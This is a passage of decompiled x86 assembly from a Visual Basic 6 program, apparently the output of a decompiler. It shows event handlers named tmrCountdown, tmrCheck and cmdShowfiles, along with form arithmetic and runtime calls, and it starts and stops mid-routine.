00852C7A: push var_00000084
00852C80: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852C85: mov var_000000E4, eax
00852C8B: jmp 852C94h
00852C8D: and var_000000E4, 00000000h
00852C94: mov eax, [ebp+08h]
00852C97: mov eax, [eax]
00852C99: push [ebp+08h]
00852C9C: call [eax+00000314h]
00852CA2: push eax
00852CA3: lea eax, var_2C
00852CA6: push eax
00852CA7: call 00410A84h ; Set (object)
00852CAC: mov var_00000088, eax
00852CB2: mov var_58, 80020004h
00852CB9: mov var_60, 0000000Ah
00852CC0: fld real4 ptr var_6C
00852CC3: fsub real4 ptr [00402BA0h]
00852CC9: fstp real4 ptr var_48
00852CCC: fstsw ax
00852CCE: test al, 0Dh
00852CD0: jnz 0085326Ch
00852CD6: mov var_50, 00000004h
00852CDD: fld real4 ptr var_64
00852CE0: fadd real4 ptr var_68
00852CE3: fadd real4 ptr [00402B54h]
00852CE9: fstp real4 ptr var_38
00852CEC: fstsw ax
00852CEE: test al, 0Dh
00852CF0: jnz 0085326Ch
00852CF6: mov var_40, 00000004h
00852CFD: push 00000010h
00852CFF: pop eax
00852D00: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852D05: lea esi, var_60
00852D08: mov edi, esp
00852D0A: movsd 
00852D0B: movsd 
00852D0C: movsd 
00852D0D: movsd 
00852D0E: push 00000010h
00852D10: pop eax
00852D11: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852D16: lea esi, var_50
00852D19: mov edi, esp
00852D1B: movsd 
00852D1C: movsd 
00852D1D: movsd 
00852D1E: movsd 
00852D1F: push 00000010h
00852D21: pop eax
00852D22: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852D27: lea esi, var_40
00852D2A: mov edi, esp
00852D2C: movsd 
00852D2D: movsd 
00852D2E: movsd 
00852D2F: movsd 
00852D30: fld real4 ptr [00402BA0h]
00852D36: push ecx
00852D37: fstp real4 ptr [esp]
00852D3A: mov eax, var_00000088
00852D40: mov eax, [eax]
00852D42: push var_00000088
00852D48: call [eax+000001D0h]
00852D4E: fclex 
00852D50: mov var_0000008C, eax
00852D56: cmp var_0000008C, 00000000h
00852D5D: jnl 852D82h
00852D5F: push 000001D0h
00852D64: push 004425E4h
00852D69: push var_00000088
00852D6F: push var_0000008C
00852D75: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852D7A: mov var_000000E8, eax
00852D80: jmp 852D89h
00852D82: and var_000000E8, 00000000h
00852D89: lea eax, var_2C
00852D8C: push eax
00852D8D: lea eax, var_28
00852D90: push eax
00852D91: lea eax, var_24
00852D94: push eax
00852D95: push 00000003h
00852D97: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00852D9C: add esp, 00000010h
00852D9F: mov var_04, 00000007h
00852DA6: mov eax, [ebp+08h]
00852DA9: mov eax, [eax]
00852DAB: push [ebp+08h]
00852DAE: call [eax+00000318h]
00852DB4: push eax
00852DB5: lea eax, var_24
00852DB8: push eax
00852DB9: call 00410A84h ; Set (object)
00852DBE: mov var_74, eax
00852DC1: lea eax, var_64
00852DC4: push eax
00852DC5: mov eax, var_74
00852DC8: mov eax, [eax]
00852DCA: push var_74
00852DCD: call [eax+78h]
00852DD0: fclex 
00852DD2: mov var_78, eax
00852DD5: cmp var_78, 00000000h
00852DD9: jnl 852DF5h
00852DDB: push 00000078h
00852DDD: push 004425E4h
00852DE2: push var_74
00852DE5: push var_78
00852DE8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852DED: mov var_000000EC, eax
00852DF3: jmp 852DFCh
00852DF5: and var_000000EC, 00000000h
00852DFC: mov eax, [ebp+08h]
00852DFF: mov eax, [eax]
00852E01: push [ebp+08h]
00852E04: call [eax+00000318h]
00852E0A: push eax
00852E0B: lea eax, var_28
00852E0E: push eax
00852E0F: call 00410A84h ; Set (object)
00852E14: mov var_7C, eax
00852E17: lea eax, var_68
00852E1A: push eax
00852E1B: mov eax, var_7C
00852E1E: mov eax, [eax]
00852E20: push var_7C
00852E23: call [eax+00000088h]
00852E29: fclex 
00852E2B: mov var_80, eax
00852E2E: cmp var_80, 00000000h
00852E32: jnl 852E51h
00852E34: push 00000088h
00852E39: push 004425E4h
00852E3E: push var_7C
00852E41: push var_80
00852E44: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852E49: mov var_000000F0, eax
00852E4F: jmp 852E58h
00852E51: and var_000000F0, 00000000h
00852E58: mov eax, [ebp+08h]
00852E5B: mov eax, [eax]
00852E5D: push [ebp+08h]
00852E60: call [eax+00000310h]
00852E66: push eax
00852E67: lea eax, var_2C
00852E6A: push eax
00852E6B: call 00410A84h ; Set (object)
00852E70: mov var_00000084, eax
00852E76: lea eax, var_6C
00852E79: push eax
00852E7A: mov eax, var_00000084
00852E80: mov eax, [eax]
00852E82: push var_00000084
00852E88: call [eax+00000088h]
00852E8E: fclex 
00852E90: mov var_00000088, eax
00852E96: cmp var_00000088, 00000000h
00852E9D: jnl 852EC2h
00852E9F: push 00000088h
00852EA4: push 004425E4h
00852EA9: push var_00000084
00852EAF: push var_00000088
00852EB5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852EBA: mov var_000000F4, eax
00852EC0: jmp 852EC9h
00852EC2: and var_000000F4, 00000000h
00852EC9: mov eax, [ebp+08h]
00852ECC: mov eax, [eax]
00852ECE: push [ebp+08h]
00852ED1: call [eax+00000310h]
00852ED7: push eax
00852ED8: lea eax, var_30
00852EDB: push eax
00852EDC: call 00410A84h ; Set (object)
00852EE1: mov var_0000008C, eax
00852EE7: mov var_58, 80020004h
00852EEE: mov var_60, 0000000Ah
00852EF5: mov var_48, 80020004h
00852EFC: mov var_50, 0000000Ah
00852F03: fld real4 ptr var_64
00852F06: fadd real4 ptr var_68
00852F09: fsub real4 ptr var_6C
00852F0C: fstp real4 ptr var_38
00852F0F: fstsw ax
00852F11: test al, 0Dh
00852F13: jnz 0085326Ch
00852F19: mov var_40, 00000004h
00852F20: push 00000010h
00852F22: pop eax
00852F23: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852F28: lea esi, var_60
00852F2B: mov edi, esp
00852F2D: movsd 
00852F2E: movsd 
00852F2F: movsd 
00852F30: movsd 
00852F31: push 00000010h
00852F33: pop eax
00852F34: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852F39: lea esi, var_50
00852F3C: mov edi, esp
00852F3E: movsd 
00852F3F: movsd 
00852F40: movsd 
00852F41: movsd 
00852F42: push 00000010h
00852F44: pop eax
00852F45: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852F4A: lea esi, var_40
00852F4D: mov edi, esp
00852F4F: movsd 
00852F50: movsd 
00852F51: movsd 
00852F52: movsd 
00852F53: fld real4 ptr [00402BA0h]
00852F59: push ecx
00852F5A: fstp real4 ptr [esp]
00852F5D: mov eax, var_0000008C
00852F63: mov eax, [eax]
00852F65: push var_0000008C
00852F6B: call [eax+000001D0h]
00852F71: fclex 
00852F73: mov var_00000090, eax
00852F79: cmp var_00000090, 00000000h
00852F80: jnl 852FA5h
00852F82: push 000001D0h
00852F87: push 004425E4h
00852F8C: push var_0000008C
00852F92: push var_00000090
00852F98: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852F9D: mov var_000000F8, eax
00852FA3: jmp 852FACh
00852FA5: and var_000000F8, 00000000h
00852FAC: lea eax, var_30
00852FAF: push eax
00852FB0: lea eax, var_2C
00852FB3: push eax
00852FB4: lea eax, var_28
00852FB7: push eax
00852FB8: lea eax, var_24
00852FBB: push eax
00852FBC: push 00000004h
00852FBE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00852FC3: add esp, 00000014h
00852FC6: mov var_04, 00000008h
00852FCD: lea eax, var_64
00852FD0: push eax
00852FD1: mov eax, [ebp+08h]
00852FD4: mov eax, [eax]
00852FD6: push [ebp+08h]
00852FD9: call [eax+00000080h]
00852FDF: fclex 
00852FE1: mov var_74, eax
00852FE4: cmp var_74, 00000000h
00852FE8: jnl 853007h
00852FEA: push 00000080h
00852FEF: push 004448FCh
00852FF4: push [ebp+08h]
00852FF7: push var_74
00852FFA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852FFF: mov var_000000FC, eax
00853005: jmp 85300Eh
00853007: and var_000000FC, 00000000h
0085300E: mov eax, [ebp+08h]
00853011: mov eax, [eax]
00853013: push [ebp+08h]
00853016: call [eax+00000304h]
0085301C: push eax
0085301D: lea eax, var_24
00853020: push eax
00853021: call 00410A84h ; Set (object)
00853026: mov var_78, eax
00853029: lea eax, var_68
0085302C: push eax
0085302D: mov eax, var_78
00853030: mov eax, [eax]
00853032: push var_78
00853035: call [eax+78h]
00853038: fclex 
0085303A: mov var_7C, eax
0085303D: cmp var_7C, 00000000h
00853041: jnl 85305Dh
00853043: push 00000078h
00853045: push 0044CDB4h
0085304A: push var_78
0085304D: push var_7C
00853050: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853055: mov var_00000100, eax
0085305B: jmp 853064h
0085305D: and var_00000100, 00000000h
00853064: lea eax, var_6C
00853067: push eax
00853068: mov eax, [ebp+08h]
0085306B: mov eax, [eax]
0085306D: push [ebp+08h]
00853070: call [eax+00000088h]
00853076: fclex 
00853078: mov var_80, eax
0085307B: cmp var_80, 00000000h
0085307F: jnl 85309Eh
00853081: push 00000088h
00853086: push 004448FCh
0085308B: push [ebp+08h]
0085308E: push var_80
00853091: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853096: mov var_00000104, eax
0085309C: jmp 8530A5h
0085309E: and var_00000104, 00000000h
008530A5: mov eax, [ebp+08h]
008530A8: mov eax, [eax]
008530AA: push [ebp+08h]
008530AD: call [eax+00000304h]
008530B3: push eax
008530B4: lea eax, var_28
008530B7: push eax
008530B8: call 00410A84h ; Set (object)
008530BD: mov var_00000084, eax
008530C3: lea eax, var_70
008530C6: push eax
008530C7: mov eax, var_00000084
008530CD: mov eax, [eax]
008530CF: push var_00000084
008530D5: call [eax+00000080h]
008530DB: fclex 
008530DD: mov var_00000088, eax
008530E3: cmp var_00000088, 00000000h
008530EA: jnl 85310Fh
008530EC: push 00000080h
008530F1: push 0044CDB4h
008530F6: push var_00000084
008530FC: push var_00000088
00853102: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853107: mov var_00000108, eax
0085310D: jmp 853116h
0085310F: and var_00000108, 00000000h
00853116: mov eax, [ebp+08h]
00853119: mov eax, [eax]
0085311B: push [ebp+08h]
0085311E: call [eax+00000304h]
00853124: push eax
00853125: lea eax, var_2C
00853128: push eax
00853129: call 00410A84h ; Set (object)
0085312E: mov var_0000008C, eax
00853134: mov var_58, 80020004h
0085313B: mov var_60, 0000000Ah
00853142: mov var_48, 80020004h
00853149: mov var_50, 0000000Ah
00853150: fld real4 ptr var_6C
00853153: fsub real4 ptr var_70
00853156: fsub real4 ptr [00402BA0h]
0085315C: fstp real4 ptr var_38
0085315F: fstsw ax
00853161: test al, 0Dh
00853163: jnz 0085326Ch
00853169: mov var_40, 00000004h
00853170: push 00000010h
00853172: pop eax
00853173: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853178: lea esi, var_60
0085317B: mov edi, esp
0085317D: movsd 
0085317E: movsd 
0085317F: movsd 
00853180: movsd 
00853181: push 00000010h
00853183: pop eax
00853184: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853189: lea esi, var_50
0085318C: mov edi, esp
0085318E: movsd 
0085318F: movsd 
00853190: movsd 
00853191: movsd 
00853192: push 00000010h
00853194: pop eax
00853195: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085319A: lea esi, var_40
0085319D: mov edi, esp
0085319F: movsd 
008531A0: movsd 
008531A1: movsd 
008531A2: movsd 
008531A3: fld real4 ptr var_64
008531A6: fsub real4 ptr var_68
008531A9: fsub real4 ptr [00402BA4h]
008531AF: fstsw ax
008531B1: test al, 0Dh
008531B3: jnz 0085326Ch
008531B9: push ecx
008531BA: fstp real4 ptr [esp]
008531BD: mov eax, var_0000008C
008531C3: mov eax, [eax]
008531C5: push var_0000008C
008531CB: call [eax+000001B4h]
008531D1: fclex 
008531D3: mov var_00000090, eax
008531D9: cmp var_00000090, 00000000h
008531E0: jnl 853205h
008531E2: push 000001B4h
008531E7: push 0044CDB4h
008531EC: push var_0000008C
008531F2: push var_00000090
008531F8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008531FD: mov var_0000010C, eax
00853203: jmp 85320Ch
00853205: and var_0000010C, 00000000h
0085320C: lea eax, var_2C
0085320F: push eax
00853210: lea eax, var_28
00853213: push eax
00853214: lea eax, var_24
00853217: push eax
00853218: push 00000003h
0085321A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085321F: add esp, 00000010h
00853222: mov var_10, 00000000h
00853229: wait 
0085322A: push 0085324Dh
0085322F: jmp 85324Ch
00853231: lea eax, var_30
00853234: push eax
00853235: lea eax, var_2C
00853238: push eax
00853239: lea eax, var_28
0085323C: push eax
0085323D: lea eax, var_24
00853240: push eax
00853241: push 00000004h
00853243: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00853248: add esp, 00000014h
0085324B: ret 
End Sub

Private sub Form__852358
00852358: push ebp
00852359: mov ebp, esp
0085235B: sub esp, 0000000Ch
0085235E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00852363: mov eax, fs:[00h]
00852369: push eax
0085236A: mov fs:[00000000h], esp
00852371: push 0000001Ch
00852373: pop eax
00852374: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852379: push ebx
0085237A: push esi
0085237B: push edi
0085237C: mov var_0C, esp
0085237F: mov var_08, 0040C7C0h
00852386: mov eax, [ebp+08h]
00852389: and eax, 00000001h
0085238C: mov var_04, eax
0085238F: mov eax, [ebp+08h]
00852392: and al, FEh
00852394: mov [ebp+08h], eax
00852397: mov eax, [ebp+08h]
0085239A: mov eax, [eax]
0085239C: push [ebp+08h]
0085239F: call [eax+04h]
008523A2: mov eax, [ebp+0Ch]
008523A5: cmp word ptr [eax], 001Bh
008523A9: jnz 852421h
008523AB: cmp [008F529Ch], 00000000h
008523B2: jnz 8523CCh
008523B4: push 008F529Ch
008523B9: push 00440F2Ch
008523BE: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008523C3: mov var_2C, 008F529Ch
008523CA: jmp 8523D3h
008523CC: mov var_2C, 008F529Ch
008523D3: mov eax, var_2C
008523D6: mov eax, [eax]
008523D8: mov var_1C, eax
008523DB: push [ebp+08h]
008523DE: lea eax, var_18
008523E1: push eax
008523E2: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008523E7: push eax
008523E8: mov eax, var_1C
008523EB: mov eax, [eax]
008523ED: push var_1C
008523F0: call [eax+10h]
008523F3: fclex 
008523F5: mov var_20, eax
008523F8: cmp var_20, 00000000h
008523FC: jnl 852415h
008523FE: push 00000010h
00852400: push 00440F1Ch
00852405: push var_1C
00852408: push var_20
0085240B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852410: mov var_30, eax
00852413: jmp 852419h
00852415: and var_30, 00000000h
00852419: lea ecx, var_18
0085241C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00852421: mov var_04, 00000000h
00852428: push 00852439h
0085242D: jmp 852438h
0085242F: lea ecx, var_18
00852432: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00852437: ret 
End Sub

Private sub tmrCountdown__85374C
0085374C: push ebp
0085374D: mov ebp, esp
0085374F: sub esp, 0000000Ch
00853752: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00853757: mov eax, fs:[00h]
0085375D: push eax
0085375E: mov fs:[00000000h], esp
00853765: push 00000024h
00853767: pop eax
00853768: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085376D: push ebx
0085376E: push esi
0085376F: push edi
00853770: mov var_0C, esp
00853773: mov var_08, 0040C870h
0085377A: mov eax, [ebp+08h]
0085377D: and eax, 00000001h
00853780: mov var_04, eax
00853783: mov eax, [ebp+08h]
00853786: and al, FEh
00853788: mov [ebp+08h], eax
0085378B: mov eax, [ebp+08h]
0085378E: mov eax, [eax]
00853790: push [ebp+08h]
00853793: call [eax+04h]
00853796: mov eax, [ebp+08h]
00853799: mov eax, [eax+34h]
0085379C: sub eax, 00000001h
0085379F: jo 008538E0h
008537A5: mov ecx, [ebp+08h]
008537A8: mov [ecx+34h], eax
008537AB: mov eax, [ebp+08h]
008537AE: cmp [eax+34h], 00000000h
008537B2: jnle 85382Ah
008537B4: cmp [008F529Ch], 00000000h
008537BB: jnz 8537D5h
008537BD: push 008F529Ch
008537C2: push 00440F2Ch
008537C7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008537CC: mov var_30, 008F529Ch
008537D3: jmp 8537DCh
008537D5: mov var_30, 008F529Ch
008537DC: mov eax, var_30
008537DF: mov eax, [eax]
008537E1: mov var_20, eax
008537E4: push [ebp+08h]
008537E7: lea eax, var_1C
008537EA: push eax
008537EB: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008537F0: push eax
008537F1: mov eax, var_20
008537F4: mov eax, [eax]
008537F6: push var_20
008537F9: call [eax+10h]
008537FC: fclex 
008537FE: mov var_24, eax
00853801: cmp var_24, 00000000h
00853805: jnl 85381Eh
00853807: push 00000010h
00853809: push 00440F1Ch
0085380E: push var_20
00853811: push var_24
00853814: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853819: mov var_34, eax
0085381C: jmp 853822h
0085381E: and var_34, 00000000h
00853822: lea ecx, var_1C
00853825: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085382A: mov eax, [ebp+08h]
0085382D: mov eax, [eax]
0085382F: push [ebp+08h]
00853832: call [eax+00000318h]
00853838: push eax
00853839: lea eax, var_1C
0085383C: push eax
0085383D: call 00410A84h ; Set (object)
00853842: mov var_20, eax
00853845: lea eax, var_18
00853848: push eax
00853849: mov eax, [ebp+08h]
0085384C: push [eax+34h]
0085384F: mov eax, [ebp+08h]
00853852: mov eax, [eax]
00853854: push [ebp+08h]
00853857: call [eax+0000071Ch]
0085385D: push var_18
00853860: mov eax, var_20
00853863: mov eax, [eax]
00853865: push var_20
00853868: call [eax+54h]
0085386B: fclex 
0085386D: mov var_24, eax
00853870: cmp var_24, 00000000h
00853874: jnl 85388Dh
00853876: push 00000054h
00853878: push 004425E4h
0085387D: push var_20
00853880: push var_24
00853883: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853888: mov var_38, eax
0085388B: jmp 853891h
0085388D: and var_38, 00000000h
00853891: lea ecx, var_18
00853894: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00853899: lea ecx, var_1C
0085389C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008538A1: mov var_04, 00000000h
008538A8: push 008538C1h
008538AD: jmp 8538C0h
008538AF: lea ecx, var_18
008538B2: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008538B7: lea ecx, var_1C
008538BA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008538BF: ret 
End Sub

Private sub tmrCheck__85363B
0085363B: push ebp
0085363C: mov ebp, esp
0085363E: sub esp, 00000018h
00853641: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00853646: mov eax, fs:[00h]
0085364C: push eax
0085364D: mov fs:[00000000h], esp
00853654: push 00000028h
00853656: pop eax
00853657: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085365C: push ebx
0085365D: push esi
0085365E: push edi
0085365F: mov var_18, esp
00853662: mov var_14, 0040C840h
00853669: mov eax, [ebp+08h]
0085366C: and eax, 00000001h
0085366F: mov var_10, eax
00853672: mov eax, [ebp+08h]
00853675: and al, FEh
00853677: mov [ebp+08h], eax
0085367A: mov var_0C, 00000000h
00853681: mov eax, [ebp+08h]
00853684: mov eax, [eax]
00853686: push [ebp+08h]
00853689: call [eax+04h]
0085368C: mov var_04, 00000001h
00853693: mov var_04, 00000002h
0085369A: push FFFFFFFFh
0085369C: call 00410A60h ; On Error ...
008536A1: mov var_04, 00000003h
008536A8: cmp [008F270Ch], 00000000h
008536AF: jnz 8536C9h
008536B1: push 008F270Ch
008536B6: push 0041B338h
008536BB: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008536C0: mov var_44, 008F270Ch
008536C7: jmp 8536D0h
008536C9: mov var_44, 008F270Ch
008536D0: mov eax, var_44
008536D3: mov eax, [eax]
008536D5: mov var_28, eax
008536D8: lea eax, var_24
008536DB: push eax
008536DC: mov eax, var_28
008536DF: mov eax, [eax]
008536E1: push var_28
008536E4: call [eax+58h]
008536E7: fclex 
008536E9: mov var_2C, eax
008536EC: cmp var_2C, 00000000h
008536F0: jnl 853709h
008536F2: push 00000058h
008536F4: push 004448FCh
008536F9: push var_28
008536FC: push var_2C
008536FF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853704: mov var_48, eax
00853707: jmp 85370Dh
00853709: and var_48, 00000000h
0085370D: push 00000003h
0085370F: push 00000000h
00853711: push 00000000h
00853713: push 00000000h
00853715: push 00000000h
00853717: push FFFFFFFFh
00853719: push var_24
0085371C: call 0043EF48h
00853721: call 00410A54h ; msvbvm60.dll.__vbaSetSystemError
00853726: mov var_10, 00000000h
0085372D: mov eax, [ebp+08h]
00853730: mov eax, [eax]
00853732: push [ebp+08h]
00853735: call [eax+08h]
00853738: mov eax, var_10
0085373B: mov ecx, var_20
0085373E: mov fs:[00000000h], ecx
00853745: pop edi
00853746: pop esi
00853747: pop ebx
00853748: leave 
00853749: retn 0004h
End Sub

Private sub cmdShowfiles__851946
00851946: push ebp
00851947: mov ebp, esp
00851949: sub esp, 0000000Ch
0085194C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00851951: mov eax, fs:[00h]
00851957: push eax
00851958: mov fs:[00000000h], esp
0085195F: push 0000001Ch
00851961: pop eax
00851962: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00851967: push ebx
00851968: push esi
00851969: push edi
0085196A: mov var_0C, esp
0085196D: mov var_08, 0040C758h
00851974: mov eax, [ebp+08h]
00851977: and eax, 00000001h
0085197A: mov var_04, eax
0085197D: mov eax, [ebp+08h]
00851980: and al, FEh
00851982: mov [ebp+08h], eax
00851985: mov eax, [ebp+08h]
00851988: mov eax, [eax]
0085198A: push [ebp+08h]
0085198D: call [eax+04h]
00851990: mov eax, [ebp+0Ch]
00851993: cmp word ptr [eax], 001Bh
00851997: jnz 851A0Fh
00851999: cmp [008F529Ch], 00000000h
008519A0: jnz 8519BAh
008519A2: push 008F529Ch
008519A7: push 00440F2Ch
008519AC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008519B1: mov var_2C, 008F529Ch
008519B8: jmp 8519C1h
008519BA: mov var_2C, 008F529Ch
008519C1: mov eax, var_2C
008519C4: mov eax, [eax]
008519C6: mov var_1C, eax
008519C9: push [ebp+08h]
008519CC: lea eax, var_18
008519CF: push eax
008519D0: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008519D5: push eax
008519D6: mov eax, var_1C
008519D9: mov eax, [eax]
008519DB: push var_1C
008519DE: call [eax+10h]
008519E1: fclex 
008519E3: mov var_20, eax
008519E6: cmp var_20, 00000000h
008519EA: jnl 851A03h
008519EC: push 00000010h
008519EE: push 00440F1Ch
008519F3: push var_1C
008519F6: push var_20
008519F9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008519FE: mov var_30, eax
00851A01: jmp 851A07h
00851A03: and var_30, 00000000h
00851A07: lea ecx, var_18
00851A0A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851A0F: mov var_04, 00000000h
00851A16: push 00851A27h
00851A1B: jmp 851A26h
00851A1D: lea ecx, var_18
00851A20: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851A25: ret 
End Sub

Private sub cmdShowfiles__851A46
00851A46: push ebp
00851A47: mov ebp, esp
00851A49: sub esp, 00000018h
00851A4C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00851A51: mov eax, fs:[00h]
00851A57: push eax
00851A58: mov fs:[00000000h], esp
00851A5F: mov eax, 000001A4h
00851A64: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00851A69: push ebx
00851A6A: push esi
00851A6B: push edi
00851A6C: mov var_18, esp
00851A6F: mov var_14, 0040C768h
00851A76: mov eax, [ebp+08h]
00851A79: and eax, 00000001h
00851A7C: mov var_10, eax
00851A7F: mov eax, [ebp+08h]
00851A82: and al, FEh
00851A84: mov [ebp+08h], eax
00851A87: mov var_0C, 00000000h
00851A8E: mov eax, [ebp+08h]
00851A91: mov eax, [eax]
00851A93: push [ebp+08h]
00851A96: call [eax+04h]
00851A99: mov var_04, 00000001h
00851AA0: mov var_04, 00000002h
00851AA7: push FFFFFFFFh
00851AA9: call 00410A60h ; On Error ...
00851AAE: mov var_04, 00000003h
00851AB5: mov eax, [ebp+08h]
00851AB8: mov eax, [eax]
00851ABA: push [ebp+08h]
00851ABD: call [eax+00000304h]
00851AC3: push eax
00851AC4: lea eax, var_4C
00851AC7: push eax
00851AC8: call 00410A84h ; Set (object)
00851ACD: mov var_00000130, eax
00851AD3: push 004552D8h ; Please wait...
00851AD8: mov eax, var_00000130
00851ADE: mov eax, [eax]
00851AE0: push var_00000130
00851AE6: call [eax+54h]
00851AE9: fclex 
00851AEB: mov var_00000134, eax
00851AF1: cmp var_00000134, 00000000h
00851AF8: jnl 851B1Ah
00851AFA: push 00000054h
00851AFC: push 0044CDB4h
00851B01: push var_00000130
00851B07: push var_00000134
00851B0D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00851B12: mov var_00000190, eax
00851B18: jmp 851B21h
00851B1A: and var_00000190, 00000000h
00851B21: lea ecx, var_4C
00851B24: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851B29: mov var_04, 00000004h
00851B30: mov eax, [ebp+08h]
00851B33: mov eax, [eax]
00851B35: push [ebp+08h]
00851B38: call [eax+00000304h]
00851B3E: push eax
00851B3F: lea eax, var_4C
00851B42: push eax
00851B43: call 00410A84h ; Set (object)
00851B48: mov var_00000130, eax
00851B4E: push 00000000h
00851B50: mov eax, var_00000130
00851B56: mov eax, [eax]
00851B58: push var_00000130
00851B5E: call [eax+0000008Ch]
00851B64: fclex 
00851B66: mov var_00000134, eax
00851B6C: cmp var_00000134, 00000000h
00851B73: jnl 851B98h
00851B75: push 0000008Ch
00851B7A: push 0044CDB4h
00851B7F: push var_00000130
00851B85: push var_00000134
00851B8B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00851B90: mov var_00000194, eax
00851B96: jmp 851B9Fh
00851B98: and var_00000194, 00000000h
00851B9F: lea ecx, var_4C
00851BA2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851BA7: mov var_04, 00000005h
00851BAE: mov eax, [ebp+08h]
00851BB1: mov eax, [eax]
00851BB3: push [ebp+08h]
00851BB6: call [eax+00000300h]
00851BBC: push eax
00851BBD: lea eax, var_4C
00851BC0: push eax
00851BC1: call 00410A84h ; Set (object)
00851BC6: mov var_00000130, eax
00851BCC: mov eax, var_00000130
00851BD2: mov eax, [eax]
00851BD4: push var_00000130
00851BDA: call [eax+000001E8h]
00851BE0: fclex 
00851BE2: mov var_00000134, eax
00851BE8: cmp var_00000134, 00000000h
00851BEF: jnl 851C14h
00851BF1: push 000001E8h
00851BF6: push 004425F4h
00851BFB: push var_00000130
00851C01: push var_00000134
00851C07: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00851C0C: mov var_00000198, eax
00851C12: jmp 851C1Bh
00851C14: and var_00000198, 00000000h
00851C1B: lea ecx, var_4C
00851C1E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851C23: mov var_04, 00000006h
00851C2A: mov var_000000CC, 00000001h
00851C34: mov var_000000D4, 00000002h
00851C3E: lea eax, var_40
00851C41: push eax
00851C42: call 00410784h ; msvbvm60.dll.__vbaRefVarAry
00851C47: push [eax]
00851C49: push 00000001h
00851C4B: call 00410886h ; UBound
00851C50: mov var_000000DC, eax
00851C56: mov var_000000E4, 00000003h
00851C60: and var_000000EC, 00000000h
00851C67: mov var_000000F4, 00000002h
00851C71: lea eax, var_000000D4
00851C77: push eax
00851C78: lea eax, var_000000E4
00851C7E: push eax
00851C7F: lea eax, var_000000F4
00851C85: push eax
00851C86: lea eax, var_00000174
00851C8C: push eax
00851C8D: lea eax, var_00000164
00851C93: push eax
00851C94: lea eax, var_30
00851C97: push eax
00851C98: call 00410A3Ch ; For
00851C9D: mov var_0000018C, eax
00851CA3: jmp 00851F20h
00851CA8: mov var_04, 00000007h
00851CAF: lea eax, var_30
00851CB2: mov var_000000CC, eax
00851CB8: mov var_000000D4, 0000400Ch
00851CC2: push 00000010h
00851CC4: pop eax
00851CC5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00851CCA: lea esi, var_000000D4
00851CD0: mov edi, esp
00851CD2: movsd 
00851CD3: movsd 
00851CD4: movsd 
00851CD5: movsd 
00851CD6: push 00000001h
00851CD8: lea eax, var_40
00851CDB: push eax
00851CDC: lea eax, var_64
00851CDF: push eax
00851CE0: call 00410952h ; msvbvm60.dll.__vbaVarIndexLoad
00851CE5: add esp, 0000001Ch
00851CE8: lea eax, var_30
00851CEB: mov var_000000EC, eax
00851CF1: mov var_000000F4, 0000400Ch
00851CFB: push 00000010h
00851CFD: pop eax
00851CFE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00851D03: lea esi, var_000000F4
00851D09: mov edi, esp
00851D0B: movsd 
00851D0C: movsd 
